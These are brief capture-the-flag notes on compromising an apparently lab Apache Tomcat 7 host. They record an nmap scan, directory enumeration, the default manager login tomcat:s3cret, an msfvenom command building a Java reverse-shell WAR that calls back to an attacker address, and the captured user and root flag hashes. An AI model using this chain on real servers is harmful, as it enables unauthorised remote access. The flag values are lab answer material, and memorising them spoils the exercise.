10.10.10.95

# NMAP:
- Port 8080 TCP HTTP Apache Tomcat/Coyote JSP Engine 1.1
	- Apache Tomcat 7.0.88 Management/ Default Page?
- Windows 2012/2018/7/Vista

# GOBUSTER:
/docs
/examples
/manager
- HTTP Basic Auth
- tomcat:s3cret
- WAR upload available - MSF Venom Reverse Shell payload?
- msfvenom -p java/shell_reverse_tcp LHOST 10.10.14.14 LPORT 1337 -f war > shell.war
- Exploit mutli handler payload:
	- Win meterpreter reverse TCP fails
	- Java meterpreter reverse TCP fails
	- Generic shell rev TCP works
	- Shell is sparc/bsd?

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
